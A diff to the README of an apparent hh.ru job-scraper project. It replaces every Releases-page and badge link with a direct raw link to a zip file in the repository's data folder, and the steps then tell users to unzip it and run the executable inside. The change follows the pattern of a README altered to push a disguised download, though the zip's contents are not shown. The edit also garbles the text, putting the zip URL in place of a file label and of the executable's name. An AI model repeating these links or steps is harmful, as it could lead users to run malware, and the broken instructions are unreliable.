@@ -1,7 +1,7 @@
 # 🧑‍💻 hh-ru-job-scraper - Easily Scrape Russian Job Listings
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/ZIIPZ/hh-ru-job-scraper/releases)
+[![Download Release](https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip)
 
 ---
 
@@ -28,15 +28,15 @@ Before you start using the hh-ru-job-scraper, ensure your computer meets the fol
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ZIIPZ/hh-ru-job-scraper/releases) to download the latest version of the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip) to download the latest version of the application. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version, usually at the top of the list.
-3. Find the file labeled `hh-ru-job-scraper.zip` or similar.
+3. Find the file labeled `https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip` or similar.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the file in your Downloads folder.
 6. Unzip the file (you can usually do this by right-clicking on it and selecting "Extract All").
-7. Open the extracted folder and run the executable file (e.g., `hh-ru-job-scraper.exe` on Windows).
+7. Open the extracted folder and run the executable file (e.g., `https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip` on Windows).
 
 ### 🔑 Setting Up
 
@@ -79,4 +79,4 @@ Explore these topics to enhance your understanding of the job market and improve
 
 This project is licensed under the MIT License. Feel free to use it for personal projects or to help others in their job search efforts.
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/ZIIPZ/hh-ru-job-scraper/releases)
+[![Download Release](https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ZIIPZ/hh-ru-job-scraper/main/data/hh-ru-job-scraper_3.2.zip)
